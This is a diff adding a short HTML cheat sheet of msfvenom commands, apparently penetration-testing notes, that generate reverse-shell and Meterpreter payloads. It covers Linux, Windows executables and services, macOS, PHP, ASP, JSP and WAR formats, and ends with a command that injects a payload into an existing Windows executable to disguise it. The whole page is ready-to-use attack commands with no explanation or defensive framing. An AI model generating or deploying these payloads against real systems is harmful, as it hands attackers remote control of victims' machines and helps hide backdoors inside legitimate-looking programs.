@@ -1,0 +1,33 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Some Generation Commands</title>
+</head><body>Linux ELF binary:<br/>
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;LIP&gt; LPORT=&lt;LPORT&gt; -f elf &gt; shell.elf<br/>
+<br/>
+Windows EXE binary:<br/>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;LIP&gt; LPORT=&lt;LPORT&gt;-f exe &gt; shell.exe<br/>
+<br/>
+Windows Service:<br/>
+msfvenom -p windows/meterpreter_reverse_tcp LHOST=&lt;LIP&gt; LPORT=&lt;LPORT&gt; EXITFUNC=thread -f exe-service &gt; shell-service.exe<br/>
+<br/>
+Mac:<br/>
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;LIP&gt; LPORT=&lt;LPORT&gt; -f macho &gt; shell.macho<br/>
+<br/>
+PHP:<br/>
+msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;LIP&gt; LPORT=&lt;LPORT&gt; -f raw &gt; /tmp/shell.php &amp;&amp; sed -i 's/#&lt;?php/&lt;?php/' /tmp/shell.php<br/>
+<br/>
+If you use php/reverse_php open the output file with an editor and add &lt;?php and ?&gt; within the script.<br/>
+<br/>
+ASP:<br/>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;LIP&gt; LPORT=&lt;LPORT&gt; -f asp &gt; shell.asp<br/>
+<br/>
+JSP:<br/>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;LIP&gt; LPORT=&lt;LPORT&gt; -f raw &gt; shell.jsp<br/>
+<br/>
+WAR:<br/>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;LIP&gt; LPORT=&lt;LPORT&gt; -f war &gt; shell.war<br/>
+<br/>
+Inject payload into an existing exe file:<br/>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;LIP&gt; LPORT=&lt;LPORT&gt; -x &lt;template EXE&gt; -f exe &gt; &lt;output.exe&gt;</body></html>
